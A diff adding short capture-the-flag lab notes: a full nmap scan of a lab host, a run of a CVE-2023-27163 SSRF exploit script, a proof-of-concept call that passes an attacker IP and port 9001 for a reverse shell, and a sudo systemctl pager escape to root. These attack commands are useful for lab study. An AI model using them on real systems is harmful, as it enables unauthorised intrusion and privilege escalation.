@@ -1,0 +1,48 @@
+└─$ nmap -A 10.10.11.224 -p 1-65535 -T5 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-25 18:47 CEST
+Warning: 10.10.11.224 giving up on port because retransmission cap hit (2).
+Stats: 0:01:38 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 18:49 (0:01:02 remaining)
+Nmap scan report for 10.10.11.224
+Host is up (0.031s latency).
+Not shown: 65222 closed tcp ports (conn-refused), 311 filtered tcp ports (no-response)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA)
+|   256 ec2eb105872a0c7db149876495dc8a21 (ECDSA)
+|_  256 b30c47fba2f212ccce0b58820e504336 (ED25519)
+55555/tcp open  unknown
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     X-Content-Type-Options: nosniff
+|     Date: Thu, 25 Jul 2024 16:48:17 GMT
+|     Content-Length: 75
+|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 302 Found
+|     Content-Type: text/html; charset=utf-8
+|     Location: /web
+|     Date: Thu, 25 Jul 2024 16:47:51 GMT
+|     Content-Length: 27
+|     href="/web">Found</a>.
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Allow: GET, OPTIONS
+|     Date: Thu, 25 Jul 2024 16:47:51 GMT
+|_    Content-Length: 0
+
+
+./CVE-2023-27163.sh http://10.129.77.100:55555/ http://127.0.0.1:8338/
+ https://www.exploit-db.com/exploits/51676 
+ └──╼ [★]$ python3 poc.py 10.10.14.128 9001 http://10.129.77.100:55555/thznpi
+ 
+ sudo /usr/bin/systemctl status trail.service
+!bin/bash
